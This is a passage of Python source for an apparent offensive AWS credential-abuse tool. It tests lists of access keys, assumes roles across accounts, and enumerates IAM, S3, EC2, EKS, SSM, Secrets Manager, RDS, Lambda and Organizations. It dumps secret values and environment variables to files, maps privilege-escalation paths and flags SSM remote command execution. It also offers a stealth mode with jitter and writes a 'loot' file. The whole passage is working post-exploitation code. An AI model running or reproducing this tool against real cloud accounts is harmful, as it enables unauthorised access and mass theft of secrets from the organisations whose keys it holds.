        "key_type": "ASIA (temporary)" if key_id.startswith("ASIA") else "AKIA (long-term)",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }

    sep = "─" * 60
    print(f"\n{sep}")
    print(f"{ts()} KEY: {key_id}")
    print(sep)

    # [1] Identity (base credential)
    print(f"{ts()} [1] Identity...", flush=True)
    identity, err = check_identity(key_id, secret, token, region, timeout)
    if err:
        print(f"{ts()}   ✗ INVALID — {err}", flush=True)
        result["status"] = "INVALID"
        result["error"] = err
        return result

    result["status"] = "VALID"
    result["identity"] = identity
    account_id = identity["account"]
    partition = detect_partition(identity["arn"])
    result["partition"] = partition

    # Override regions for AWS China
    if partition == "aws-cn":
        regions = regions_for_partition(partition, args.all_regions)
        if region == "us-east-1":  # default wasn't overridden by user
            region = "cn-northwest-1"

    print(f"{ts()}   ✓ ARN     : {identity['arn']}", flush=True)
    print(f"{ts()}   ✓ Account : {account_id} ({identity.get('account_alias') or 'no alias'})", flush=True)
    print(f"{ts()}   ✓ UserID  : {identity['user_id']}", flush=True)
    print(f"{ts()}   ✓ Type    : {identity['key_type']}", flush=True)
    if partition != "aws":
        print(f"{ts()}   ✓ Partition: {partition} ({', '.join(regions)})", flush=True)

    # ── Pull secrets only mode — skip all other enumeration ──────────
    if getattr(args, 'pull_secrets_only', False):
        print(f"{ts()} [*] Pull-secrets-only mode — skipping enumeration", flush=True)
        result["ssm"] = {}
        result["secrets_manager"] = {}
        ssm_total_params = 0
        sm_total = 0
        for r in regions:
            print(f"{ts()}   → {r}...", flush=True)
            ssm = check_ssm(key_id, secret, token, r, timeout,
                            pull_secrets=True, out_dir=out_dir,
                            account_id=f"{account_id}",
                            stealth=getattr(args, "stealth", False))
            result["ssm"][r] = ssm
            param_count = ssm.get("parameter_count", 0)
            ssm_total_params += param_count
            if param_count > 0:
                print(f"{ts()}     SSM: {param_count} params ({ssm.get('secure_string_count',0)} SecureString)", flush=True)
                if ssm.get("params_file"):
                    print(f"{ts()}     Names  → {ssm['params_file']}", flush=True)
                if ssm.get("secrets_file"):
                    print(f"{ts()}     Values → {ssm['secrets_file']} ({ssm.get('readable_count',0)} readable)", flush=True)

            sm = check_secrets_manager(key_id, secret, token, r, timeout,
                                        pull_secrets=True, out_dir=out_dir,
                                        account_id=f"{account_id}")
            result["secrets_manager"][r] = sm
            if "error" not in sm and sm.get("total", 0) > 0:
                sm_total += sm["total"]
                print(f"{ts()}     SM: {sm['total']} secrets", flush=True)
                if sm.get("names_file"):
                    print(f"{ts()}     Names  → {sm['names_file']}", flush=True)
                if sm.get("values_file"):
                    print(f"{ts()}     Values → {sm['values_file']} ({sm.get('readable_count',0)} readable)", flush=True)

        print(f"{ts()} [+] Total: {ssm_total_params} SSM params, {sm_total} SM secrets", flush=True)
        return result
    if identity.get("is_root"):
        print(f"{ts()}   ⚠ ROOT ACCOUNT", flush=True)

    # [1b] Role assumption — assume into target accounts, then enumerate with assumed creds
    if not args.no_assume and args.role_name:
        # If user explicitly specified accounts, only try those.
        # Otherwise fall back to own account.
        if extra_accounts:
            assume_accounts = dict(extra_accounts)
        else:
            assume_accounts = {account_id: f"account-{account_id}"}

        print(f"{ts()} [1b] Assuming {args.role_name} in {len(assume_accounts)} account(s)...", flush=True)

        for acct_id, alias in assume_accounts.items():
            print(f"{ts()}   Trying {args.role_name} @ {alias} ({acct_id})...", flush=True)
            creds_tuple = try_assume_role(key_id, secret, token, region, timeout, args.role_name, acct_id, partition)
            if creds_tuple:
                ak, sk, st, role_arn = creds_tuple
                assumed_identity, _ = check_identity(ak, sk, st, region, timeout)
                key_id, secret, token = ak, sk, st
                identity = assumed_identity if assumed_identity else identity
                account_id = identity["account"] if identity else acct_id
                print(f"{ts()}   ✓ Assumed {role_arn}", flush=True)
                print(f"{ts()}     ARN: {identity['arn']}", flush=True)
                result["credential_used"] = {"key_id": ak, "label": f"{args.role_name} @ {alias}", "arn": identity["arn"]}
                break  # Use first successful assumption
            else:
                print(f"{ts()}   ✗ Denied", flush=True)
        else:
            print(f"{ts()}   All role assumptions denied — continuing with base credential", flush=True)
            result["credential_used"] = {"key_id": key_id, "label": "base", "arn": identity["arn"]}
    else:
        reason = "--no-assume" if args.no_assume else "no --role-name specified"
        print(f"{ts()} [1b] Skipping role assumption ({reason})", flush=True)
        result["credential_used"] = {"key_id": key_id, "label": "base", "arn": identity["arn"]}

    # [2] IAM
    print(f"{ts()} [2] IAM...", flush=True)
    iam = check_iam(key_id, secret, token, region, timeout, identity)
    result["iam"] = iam
    if iam.get("username"):
        print(f"{ts()}   Username         : {iam['username']}", flush=True)
        print(f"{ts()}   Created          : {iam.get('created','')}", flush=True)
        print(f"{ts()}   Groups           : {iam.get('groups', [])}", flush=True)
        print(f"{ts()}   Attached policies: {iam.get('attached_policies', [])}", flush=True)
        print(f"{ts()}   Inline policies  : {iam.get('inline_policies', [])}", flush=True)
        if iam.get("access_keys"):
            for k in iam["access_keys"]:
                print(f"{ts()}   Key: {k['key_id']} | {k['status']} | created {k['created']}", flush=True)
    if iam.get("visible_users"):
        print(f"{ts()}   Visible users : {len(iam['visible_users'])}", flush=True)
    if iam.get("visible_roles"):
        print(f"{ts()}   Visible roles : {len(iam['visible_roles'])}", flush=True)

    # [3] Privilege simulation
    jitter(getattr(args, "stealth", False))
    if getattr(args, "stealth", False):
        print(f"{ts()} [3] Privilege simulation — SKIPPED (stealth mode)", flush=True)
        result["privs"] = {"skipped": "stealth mode"}
    elif not args.fast:
        print(f"{ts()} [3] Privilege simulation ({len(PRIV_CHECKS)} actions)...", flush=True)
        privs = check_privs(key_id, secret, token, region, timeout, identity)
        result["privs"] = privs
        if "allowed" in privs:
            print(f"{ts()}   Allowed  : {len(privs['allowed'])}/{len(PRIV_CHECKS)}", flush=True)
            if privs.get("high_value"):
                print(f"{ts()}   ⚠ HIGH VALUE PERMISSIONS:", flush=True)
                for hv in privs["high_value"]:
                    print(f"{ts()}     → {hv}", flush=True)
        else:
            print(f"{ts()}   {privs.get('error', 'no data')}", flush=True)
    else:
        print(f"{ts()} [3] Skipping priv simulation (--fast)", flush=True)
        result["privs"] = {}

    # [3b] Privilege escalation path analysis
    allowed_actions = result.get("privs", {}).get("allowed", [])
    if allowed_actions:
        print(f"{ts()} [3b] Privilege escalation path analysis...", flush=True)
        privesc = check_privesc_paths(allowed_actions, identity, iam)
        result["privesc_paths"] = privesc
        if privesc:
            critical = [p for p in privesc if p["risk"] == "CRITICAL"]
            high = [p for p in privesc if p["risk"] == "HIGH"]
            medium = [p for p in privesc if p["risk"] == "MEDIUM"]
            print(f"{ts()}   ⚠ {len(privesc)} PRIVESC PATHS FOUND "
                  f"({len(critical)} critical, {len(high)} high, {len(medium)} medium)", flush=True)
            for p in privesc:
                risk_color = "⚠" if p["risk"] == "CRITICAL" else "→"
                print(f"{ts()}   {risk_color} [{p['risk']}] {p['name']}", flush=True)
                print(f"{ts()}     Actions : {', '.join(p['matched_actions'])}", flush=True)
                print(f"{ts()}     Exploit : {p['exploit'][:120]}", flush=True)
                if p.get("targets"):
                    print(f"{ts()}     Targets : {', '.join(p['targets'][:5])}{'...' if len(p.get('targets',[])) > 5 else ''}", flush=True)
                if p.get("assumable_roles"):
                    print(f"{ts()}     Roles   : {', '.join(p['assumable_roles'][:5])}{'...' if len(p.get('assumable_roles',[])) > 5 else ''}", flush=True)
        else:
            print(f"{ts()}   No known privesc paths with current permissions", flush=True)
    else:
        print(f"{ts()} [3b] Privesc analysis — skipped (no priv simulation data)", flush=True)
        result["privesc_paths"] = []

    # Save privesc paths to file if any found
    if result.get("privesc_paths"):
        privesc_file = os.path.join(out_dir, f"privesc_{account_id}.txt")
        with open(privesc_file, "w") as f:
            f.write(f"Privilege Escalation Paths — Account {account_id}\n")
            f.write(f"Identity: {identity.get('arn', 'unknown')}\n")
            f.write(f"Total paths: {len(result['privesc_paths'])}\n")
            f.write("=" * 60 + "\n\n")
            for p in result["privesc_paths"]:
                f.write(f"[{p['risk']}] {p['name']}\n")
                f.write(f"  ID      : {p['id']}\n")
                f.write(f"  Actions : {', '.join(p['matched_actions'])}\n")
                f.write(f"  Desc    : {p['description']}\n")
                f.write(f"  Exploit : {p['exploit']}\n")
                if p.get("targets"):
                    f.write(f"  Targets : {', '.join(p['targets'])}\n")
                if p.get("assumable_roles"):
                    f.write(f"  Roles   : {', '.join(p['assumable_roles'])}\n")
                f.write("\n")
        print(f"{ts()}   Privesc paths saved → {privesc_file}", flush=True)

    # [4] S3
    jitter(getattr(args, "stealth", False))
    print(f"{ts()} [4] S3...", flush=True)
    s3 = check_s3(key_id, secret, token, region, timeout)
    result["s3"] = s3
    if "error" not in s3:
        print(f"{ts()}   Total     : {s3['total']}", flush=True)
        print(f"{ts()}   Terraform : {len(s3.get('terraform_buckets',[]))} buckets", flush=True)
        print(f"{ts()}   Backup    : {len(s3.get('backup_buckets',[]))} buckets", flush=True)
        print(f"{ts()}   Logs      : {len(s3.get('log_buckets',[]))} buckets", flush=True)
        print(f"{ts()}   Secrets   : {len(s3.get('secret_buckets',[]))} buckets", flush=True)
        print(f"{ts()}   CI/CD     : {len(s3.get('cicd_buckets',[]))} buckets", flush=True)
        if s3.get("public"):
            print(f"{ts()}   ⚠ PUBLIC  : {len(s3['public'])} buckets — {', '.join(s3['public'][:5])}", flush=True)
        if s3.get("policy_writable"):
            print(f"{ts()}   ⚠ WRITABLE: {len(s3['policy_writable'])} buckets with public write policy", flush=True)
            for pw in s3["policy_writable"][:5]:
                print(f"{ts()}     {pw['bucket']} — {', '.join(pw['actions'])}", flush=True)
        no_ver = s3.get("versioning_disabled", [])
        if no_ver:
            print(f"{ts()}   No versioning: {len(no_ver)}/{s3['total']} buckets", flush=True)
    else:
        print(f"{ts()}   ✗ {s3['error']}", flush=True)

    # [5] EC2 — all regions
    print(f"{ts()} [5] EC2 (all {len(regions)} regions)...", flush=True)
    result["ec2"] = {}
    ec2_total_inst = 0
    ec2_total_vpcs = 0
    for r in regions:
        ec2 = check_ec2(key_id, secret, token, r, timeout)
        inst = ec2.get("running_count", 0)
        vpcs = len(ec2.get("vpcs", []))
        if inst > 0 or vpcs > 0:
            result["ec2"][r] = ec2
            ec2_total_inst += inst
            ec2_total_vpcs += vpcs
            print(f"{ts()}   {r}: {inst} instances, {vpcs} VPCs", flush=True)
            for i in ec2.get("running_instances", [])[:3]:
                print(f"{ts()}     {i['id']} | {i['type']} | {i.get('private_ip','')} | {i['name']}", flush=True)
    if ec2_total_inst == 0 and ec2_total_vpcs == 0:
        print(f"{ts()}   Nothing accessible", flush=True)
    print(f"{ts()}   Total: {ec2_total_inst} instances, {ec2_total_vpcs} VPCs", flush=True)

    # [6] EKS via list-clusters API
    jitter(getattr(args, "stealth", False))
    print(f"{ts()} [6] EKS clusters across {len(regions)} regions...", flush=True)
    eks = check_eks(key_id, secret, token, timeout, regions)
    result["eks"] = eks
    cluster_regions = {k: v for k, v in eks.items() if not k.endswith("_details")}
    if cluster_regions:
        total = sum(len(v) for v in cluster_regions.values())
        print(f"{ts()}   ✓ {total} cluster(s) found:", flush=True)
        for r, clusters in cluster_regions.items():
            for c in clusters:
                details = eks.get(f"{r}_details", {}).get(c, {})
                print(f"{ts()}     {r} / {c} | {details.get('status','')} | k8s {details.get('version','')}", flush=True)
    else:
        print(f"{ts()}   No clusters accessible via list-clusters", flush=True)

    # [7] ECR — all regions
    print(f"{ts()} [7] ECR (all {len(regions)} regions)...", flush=True)
    result["ecr"] = {}
    ecr_total = 0
    for r in regions:
        ecr = check_ecr(key_id, secret, token, r, timeout)
        if ecr["total"] > 0:
            result["ecr"][r] = ecr
            ecr_total += ecr["total"]
            print(f"{ts()}   {r}: {ecr['total']} repos", flush=True)
            print(f"{ts()}     Sample: {[x['name'] for x in ecr['repos'][:3]]}"
                  f"{'...' if ecr['total'] > 3 else ''}", flush=True)
    if ecr_total == 0:
        print(f"{ts()}   Nothing accessible", flush=True)
    print(f"{ts()}   Total across all regions: {ecr_total} repos", flush=True)

    # [8] SSM — all regions
    print(f"{ts()} [8] SSM (all {len(regions)} regions)...", flush=True)
    result["ssm"] = {}
    ssm_total_params = 0
    ssm_total_instances = 0
    for r in regions:
        print(f"{ts()}   → {r}...", flush=True)
        ssm = check_ssm(key_id, secret, token, r, timeout,
                        pull_secrets=pull, out_dir=out_dir,
                        account_id=f"{account_id}",
                        stealth=getattr(args, "stealth", False))
        result["ssm"][r] = ssm
        inst_count = ssm.get("managed_instances_count", 0)
        param_count = ssm.get("parameter_count", 0)
        ssm_total_params += param_count
        ssm_total_instances += inst_count
        if inst_count > 0 or param_count > 0:
            print(f"{ts()}     Instances  : {inst_count}", flush=True)
            if ssm.get("managed_instances"):
                for inst in ssm["managed_instances"][:3]:
                    print(f"{ts()}       {inst['id']} | {inst['ip']} | {inst['platform']} | {inst['ping']}", flush=True)
            print(f"{ts()}     Parameters : {param_count} ({ssm.get('secure_string_count',0)} SecureString)", flush=True)
            if ssm.get("params_file"):
                print(f"{ts()}     Names  → {ssm['params_file']}", flush=True)
            if ssm.get("secrets_file"):
                print(f"{ts()}     Values → {ssm['secrets_file']} ({ssm.get('readable_count',0)} readable)", flush=True)
            gpa = ssm.get("get_parameter_access", "NOT TESTED")
            print(f"{ts()}     GetParameter : {'⚠' if 'ALLOWED' in str(gpa) else '✗'} {gpa}", flush=True)
            sc = ssm.get("send_command_access", "NOT TESTED")
            print(f"{ts()}     SendCommand  : {'⚠' if 'ALLOWED' in str(sc) else '✗'} {sc}", flush=True)
        else:
            print(f"{ts()}     Nothing accessible", flush=True)
    print(f"{ts()}   Total across all regions: {ssm_total_instances} instances, {ssm_total_params} params", flush=True)

    # [9] Secrets Manager — all regions
    print(f"{ts()} [9] Secrets Manager (all {len(regions)} regions)...", flush=True)
    result["secrets_manager"] = {}
    sm_total = 0
    for r in regions:
        print(f"{ts()}   → {r}...", flush=True)
        sm = check_secrets_manager(key_id, secret, token, r, timeout,
                                    pull_secrets=pull, out_dir=out_dir,
                                    account_id=f"{account_id}")
        result["secrets_manager"][r] = sm
        if "error" not in sm and sm.get("total", 0) > 0:
            sm_total += sm["total"]
            print(f"{ts()}     {sm['total']} secrets", flush=True)
            if sm.get("names_file"):
                print(f"{ts()}     Names → {sm['names_file']}", flush=True)
            if sm.get("values_file"):
                print(f"{ts()}     Values → {sm['values_file']} ({sm.get('readable_count',0)} readable)", flush=True)
        else:
            print(f"{ts()}     Nothing accessible", flush=True)
    print(f"{ts()}   Total across all regions: {sm_total} secrets", flush=True)

    # [10] RDS — all regions
    print(f"{ts()} [10] RDS (all {len(regions)} regions)...", flush=True)
    result["rds"] = {}
    rds_total_inst = 0
    rds_total_clus = 0
    for r in regions:
        rds = check_rds(key_id, secret, token, r, timeout)
        inst = rds.get("instances", [])
        clus = rds.get("clusters", [])
        if inst or clus:
            result["rds"][r] = rds
            rds_total_inst += len(inst)
            rds_total_clus += len(clus)
            print(f"{ts()}   {r}: {len(inst)} instances, {len(clus)} clusters", flush=True)
            for i in inst:
                print(f"{ts()}     {i['id']} | {i['engine']} | {i['endpoint']} | "
                      f"public={i['publicly_accessible']}", flush=True)
    if rds_total_inst == 0 and rds_total_clus == 0:
        print(f"{ts()}   Nothing accessible", flush=True)
    print(f"{ts()}   Total: {rds_total_inst} instances, {rds_total_clus} clusters", flush=True)

    # [11] Lambda — all regions
    print(f"{ts()} [11] Lambda (all {len(regions)} regions)...", flush=True)
    result["lambda"] = {}
    lambda_total = 0
    for r in regions:
        lam = check_lambda(key_id, secret, token, r, timeout)
        if lam["total"] > 0:
            result["lambda"][r] = lam
            lambda_total += lam["total"]
            print(f"{ts()}   {r}: {lam['total']} functions", flush=True)
            for fn in lam["functions"][:3]:
                print(f"{ts()}     {fn['name']} | {fn.get('runtime','')} | {fn.get('role','')[:60]}", flush=True)
    if lambda_total == 0:
        print(f"{ts()}   Nothing accessible", flush=True)
    print(f"{ts()}   Total: {lambda_total} functions", flush=True)

    # [12] CloudWatch Logs — all regions
    print(f"{ts()} [12] CloudWatch Logs (all {len(regions)} regions)...", flush=True)
    result["logs"] = {}
    logs_total = 0
    for r in regions:
        logs = check_logs(key_id, secret, token, r, timeout)
        if "error" not in logs and logs.get("total", 0) > 0:
            result["logs"][r] = logs
            logs_total += logs["total"]
            print(f"{ts()}   {r}: {logs['total']} log groups", flush=True)
    if logs_total == 0:
        print(f"{ts()}   Nothing accessible", flush=True)
    print(f"{ts()}   Total: {logs_total} log groups", flush=True)

    # [13] Organizations
    print(f"{ts()} [13] Organizations...", flush=True)
    org = check_org(key_id, secret, token, region, timeout, partition)
    result["organizations"] = org
    if "error" not in org:
        print(f"{ts()}   Org ID        : {org.get('org_id')}", flush=True)
        print(f"{ts()}   Master account: {org.get('master_account')}", flush=True)
        print(f"{ts()}   Master email  : {org.get('master_email')}", flush=True)
        if org.get("accounts_error"):
            print(f"{ts()}   Accounts      : ✗ {org['accounts_error']}", flush=True)
        elif org.get("accounts"):
            print(f"{ts()}   Accounts      : {org.get('account_count',0)} (feeding into role assumption)", flush=True)
            for a in org["accounts"]:
                print(f"{ts()}     {a['id']} | {a['name']:40s} | {a['status']}", flush=True)
        else:
            print(f"{ts()}   Accounts      : none enumerated", flush=True)
    else:
        print(f"{ts()}   ✗ {org['error']}", flush=True)

    # [14] Environment variables (Lambda + ECS)
    print(f"{ts()} [14] Environment variables (all {len(regions)} regions)...", flush=True)
    result["env_vars"] = {}
    env_total_lambda = 0
    env_total_ecs = 0
    env_interesting = 0
    for r in regions:
        ev = check_env_vars(key_id, secret, token, r, timeout)
        if ev.get("lambda") or ev.get("ecs"):
            result["env_vars"][r] = ev
            env_total_lambda += len(ev.get("lambda", []))
            env_total_ecs += len(ev.get("ecs", []))
            for fn_data in ev.get("lambda", []):
                if fn_data.get("interesting"):
                    env_interesting += len(fn_data["interesting"])
                    print(f"{ts()}   {r}: Lambda {fn_data['function']} — {len(fn_data['interesting'])} interesting vars", flush=True)
                    for k, v in list(fn_data["interesting"].items())[:3]:
                        print(f"{ts()}     {k}={v[:50]}{'...' if len(str(v)) > 50 else ''}", flush=True)
            for td_data in ev.get("ecs", []):
                if td_data.get("interesting"):
                    env_interesting += len(td_data["interesting"])
                    print(f"{ts()}   {r}: ECS {td_data['task_def']}/{td_data['container']} — {len(td_data['interesting'])} interesting vars", flush=True)
    if env_total_lambda == 0 and env_total_ecs == 0:
        print(f"{ts()}   No env vars accessible", flush=True)
    else:
        print(f"{ts()}   Total: {env_total_lambda} Lambda, {env_total_ecs} ECS — {env_interesting} interesting vars", flush=True)

    # Save env vars to file if any found
    if result["env_vars"]:
        env_file = os.path.join(out_dir, f"env_vars_{account_id}.txt")
        with open(env_file, "w") as f:
            f.write(f"Environment Variables — Account {account_id}\n")
            f.write("=" * 60 + "\n\n")
            for region, ev in result["env_vars"].items():
                for fn_data in ev.get("lambda", []):
                    f.write(f"[Lambda] {fn_data['function']} ({region})\n")
                    f.write(f"  Role: {fn_data.get('role', 'N/A')}\n")
                    for k, v in fn_data.get("all_vars", {}).items():
                        marker = " <<<" if k in fn_data.get("interesting", {}) else ""
                        f.write(f"  {k}={v}{marker}\n")
                    f.write("\n")
                for td_data in ev.get("ecs", []):
                    f.write(f"[ECS] {td_data['task_def']}/{td_data['container']} ({region})\n")
                    f.write(f"  Role: {td_data.get('role', 'N/A')}\n")
                    for k, v in td_data.get("all_vars", {}).items():
                        marker = " <<<" if k in td_data.get("interesting", {}) else ""
                        f.write(f"  {k}={v}{marker}\n")
                    f.write("\n")
        print(f"{ts()}   Env vars saved → {env_file}", flush=True)

    # [15] Role trust analysis
    print(f"{ts()} [15] Role trust analysis...", flush=True)
    role_trusts = check_role_trusts(key_id, secret, token, region, timeout)
    result["role_trusts"] = role_trusts
    if "error" not in role_trusts:
        print(f"{ts()}   Total roles    : {role_trusts['total_roles']}", flush=True)
        if role_trusts.get("wildcard_trusts"):
            print(f"{ts()}   ⚠ WILDCARD    : {len(role_trusts['wildcard_trusts'])} roles (anyone can assume!)", flush=True)
            for wt in role_trusts["wildcard_trusts"][:5]:
                cond = " (with conditions)" if wt.get("condition") else " (NO conditions!)"
                print(f"{ts()}     {wt['role']}{cond}", flush=True)
        if role_trusts.get("external_trusts"):
            print(f"{ts()}   ⚠ EXTERNAL    : {len(role_trusts['external_trusts'])} roles trust external accounts", flush=True)
            for et in role_trusts["external_trusts"][:5]:
                print(f"{ts()}     {et['role']} ← {et['external_principal']}", flush=True)
            if len(role_trusts["external_trusts"]) > 5:
                print(f"{ts()}     ... and {len(role_trusts['external_trusts'])-5} more", flush=True)
        if not role_trusts.get("wildcard_trusts") and not role_trusts.get("external_trusts"):
            print(f"{ts()}   No overpermissive trusts found", flush=True)
    else:
        print(f"{ts()}   ✗ {role_trusts['error']}", flush=True)

    # [16] Loot generation
    print(f"{ts()} [16] Generating loot...", flush=True)
    loot_path = generate_loot(result, out_dir, account_id)
    print(f"{ts()}   ✓ Loot file → {loot_path}", flush=True)

    return result


# ─── Summary ─────────────────────────────────────────────────────────────────

def print_summary(all_results, out_dir=None):
    lines = []
    def out(msg=""):
        print(msg)
        lines.append(msg)

    out(f"\n{'═'*60}")
    out("  SUMMARY")
    out(f"{'═'*60}")

    valid = [r for r in all_results if r.get("status") == "VALID"]
    invalid = [r for r in all_results if r.get("status") == "INVALID"]

    out(f"  Total   : {len(all_results)}")
    out(f"  Valid   : {len(valid)}")
    out(f"  Invalid : {len(invalid)}")

    for r in valid:
        ident = r.get("identity", {})
        eks = {k: v for k, v in r.get("eks", {}).items() if not k.endswith("_details")}
        eks_count = sum(len(v) for v in eks.values())
        assumed = sum(1 for v in r.get("role_assumption", {}).values()
                      if v.get("status") == "SUCCESS")
        hv = r.get("privs", {}).get("high_value", [])

        out(f"\n  ┌─ {r['key_id']}")
        alias = ident.get('account_alias')
        acct_str = f"{ident.get('account','N/A')} ({alias})" if alias else ident.get('account','N/A')
        out(f"  │  ARN          : {ident.get('arn','N/A')}")
        out(f"  │  Account      : {acct_str}")
        ec2_inst = sum(v.get("running_count",0) for v in r.get("ec2",{}).values() if isinstance(v, dict))
        out(f"  │  EC2 instances: {ec2_inst}")
        out(f"  │  S3 buckets   : {r.get('s3',{}).get('total',0)}")
        out(f"  │  EKS clusters : {eks_count}")
        ecr_total = sum(v.get("total",0) for v in r.get("ecr",{}).values() if isinstance(v, dict))
        ssm_total = sum(v.get("parameter_count",0) for v in r.get("ssm",{}).values() if isinstance(v, dict))
        sm_total  = sum(v.get("total",0) for v in r.get("secrets_manager",{}).values() if isinstance(v, dict))
        rds_total = sum(len(v.get("instances",[])) for v in r.get("rds",{}).values() if isinstance(v, dict))
        lam_total = sum(v.get("total",0) for v in r.get("lambda",{}).values() if isinstance(v, dict))
        ssm_inst  = sum(v.get("managed_instances_count",0) for v in r.get("ssm",{}).values() if isinstance(v, dict))
        out(f"  │  ECR repos    : {ecr_total}")
        out(f"  │  SSM params   : {ssm_total} ({ssm_inst} managed instances)")
        out(f"  │  SM secrets   : {sm_total}")
        out(f"  │  RDS          : {rds_total}")
        out(f"  │  Lambda       : {lam_total}")
        # RCE indicators
        rce_regions = []
        for region, ssm_data in r.get("ssm", {}).items():
            if isinstance(ssm_data, dict):
                sc = ssm_data.get("send_command_access", "")
                if "ALLOWED" in str(sc):
                    inst_count = ssm_data.get("managed_instances_count", 0)
                    rce_regions.append(f"{region} ({inst_count} instances)")
        if rce_regions:
            out(f"  │  ⚠ RCE       : SSM SendCommand ALLOWED in {', '.join(rce_regions)}")
        if ssm_inst > 0 and not rce_regions:
            out(f"  │  SSM targets  : {ssm_inst} managed instances (SendCommand not tested or denied)")
        if assumed:
            out(f"  │  Role assumed : ⚠ {assumed} account(s)")
        if hv:
            out(f"  │  High privs  : {', '.join(hv[:3])}{'...' if len(hv)>3 else ''}")
        privesc = r.get("privesc_paths", [])
        if privesc:
            critical = [p for p in privesc if p["risk"] == "CRITICAL"]
            high = [p for p in privesc if p["risk"] == "HIGH"]
            out(f"  │  Privesc     : ⚠ {len(privesc)} paths ({len(critical)} critical, {len(high)} high)")
            for p in privesc[:5]:
                out(f"  │    [{p['risk']}] {p['name']}")
            if len(privesc) > 5:
                out(f"  │    ... and {len(privesc)-5} more")
        out(f"  └{'─'*50}")

    out(f"{'═'*60}\n")

    # Save summary to output dir
    if out_dir:
        summary_path = os.path.join(out_dir, "summary.txt")
        with open(summary_path, "w") as f:
            f.write("\n".join(lines) + "\n")
        print(f"{ts()} ✓ Summary saved to {summary_path}")


# ─── Entry point ─────────────────────────────────────────────────────────────

def load_credentials(args):
    creds = []
    if args.profile:
        # Load creds from AWS CLI profile
        try:
            session = boto3.Session(profile_name=args.profile)
            frozen = session.get_credentials().get_frozen_credentials()
            key_id = frozen.access_key
            secret = frozen.secret_key
            token = frozen.token if frozen.token else None
            creds.append((key_id, secret, token))
            print(f"{ts()} Loaded profile '{args.profile}' ({key_id[:12]}...)", flush=True)
        except Exception as e:
            print(f"{ts()} [!] Failed to load profile '{args.profile}': {e}", file=sys.stderr)
            sys.exit(1)
    if args.cred:
        parts = args.cred.strip().split(":", 2)
        if len(parts) >= 2:
            creds.append((parts[0], parts[1], parts[2] if len(parts) > 2 else None))
    if args.file:
        if not os.path.exists(args.file):
            print(f"[!] File not found: {args.file}", file=sys.stderr)
            sys.exit(1)
        with open(args.file) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split(":", 2)
                if len(parts) >= 2:
                    creds.append((parts[0], parts[1], parts[2] if len(parts) > 2 else None))
    return creds


def choose_credential(creds):
    """Interactive credential selection menu"""
    print(f"\n{'─'*60}")
    print(f"  SELECT CREDENTIAL")
    print(f"{'─'*60}")
    for i, (key_id, secret, token) in enumerate(creds):
        key_type = "ASIA (temp)" if key_id.startswith("ASIA") else "AKIA (long)"
        token_flag = " [+token]" if token else ""
        print(f"  [{i+1}] {key_id} ({key_type}){token_flag}")
    print(f"  [0] Exit")
    print(f"{'─'*60}")

    while True:
        try:
            choice = input("  Choose: ").strip()
            if choice == "0":
                return None
            idx = int(choice) - 1
            if 0 <= idx < len(creds):
                return idx
            print(f"  [!] Invalid choice — enter 1-{len(creds)} or 0 to exit")
        except (ValueError, EOFError, KeyboardInterrupt):
            return None


if __name__ == "__main__":
    args = parse_args()
    banner()

    extra_accounts = load_accounts(args)
    creds = load_credentials(args)

    if not creds:
        print(f"{ts()} [!] No valid credentials found", file=sys.stderr)
        sys.exit(1)

    # Build evidence-keeping output dir: <key_id>_<YYYYMMDD>/
    if args.out_dir is None:
        key_prefix = creds[0][0] if len(creds) == 1 else "multi"
        datestr = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        args.out_dir = os.path.join(os.getcwd(), f"{key_prefix}_{datestr}")
    os.makedirs(args.out_dir, exist_ok=True)

    print(f"  Credentials : {len(creds)}")
    print(f"  Region      : {args.region}")
    print(f"  Role        : {args.role_name}")
    print(f"  All regions : {args.all_regions}")
    print(f"  Pull secrets: {args.pull_secrets}")
    print(f"  Fast mode   : {args.fast}")
    print(f"  Stealth     : {getattr(args, 'stealth', False)}")
    print(f"  Output      : {args.out_dir}")
    print(f"  Started     : {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}")
    print()

    all_results = []
    tested = set()

    # If single credential via -c or --profile, or -a flag, run all without menu
    if (args.cred or args.profile) and not args.file:
        key_id, secret, token = creds[0]
        result = enumerate_credential(key_id, secret, token, args, extra_accounts)
        all_results.append(result)
    elif getattr(args, 'all', False):
        # Run all credentials sequentially, no menu
        for i, (key_id, secret, token) in enumerate(creds, 1):
            print(f"\n{ts()} [{i}/{len(creds)}] {key_id}", flush=True)
            result = enumerate_credential(key_id, secret, token, args, extra_accounts)
            all_results.append(result)
    else:
        # Interactive selection loop
        while True:
            remaining = [(i, c) for i, c in enumerate(creds) if i not in tested]
            if not remaining:
                print(f"\n{ts()} All credentials have been tested.")
                break

            display_creds = [c for _, c in remaining]
            display_idx_map = [i for i, _ in remaining]

            print(f"\n{ts()} {len(remaining)} credential(s) remaining untested")
            choice = choose_credential(display_creds)

            if choice is None:
                print(f"{ts()} Exiting.")
                break

            actual_idx = display_idx_map[choice]
            key_id, secret, token = creds[actual_idx]
            tested.add(actual_idx)

            result = enumerate_credential(key_id, secret, token, args, extra_accounts)
            all_results.append(result)

            remaining_after = [i for i, _ in enumerate(creds) if i not in tested]
            if remaining_after:
                print(f"\n{ts()} {len(remaining_after)} credential(s) still untested.")
                try:
                    cont = input(f"  Continue with another? [Y/n]: ").strip().lower()
                    if cont in ("n", "no", "q", "quit", "exit"):
                        print(f"{ts()} Done.")
                        break
                except (EOFError, KeyboardInterrupt):
                    break
            else:
                print(f"\n{ts()} All credentials tested.")
                break

    if all_results:
        print_summary(all_results, out_dir=args.out_dir)

    for r in all_results:
        if r.get("status") != "VALID":
            continue
        key_id = r.get("key_id", "unknown")
        if args.output and args.output != "__auto__":
            out_path = args.output
        else:
            out_path = os.path.join(args.out_dir, f"{key_id}.json")
        with open(out_path, "w") as f:
            json.dump(r, f, indent=2, default=str)
        print(f"{ts()} ✓ JSON saved to {out_path}")
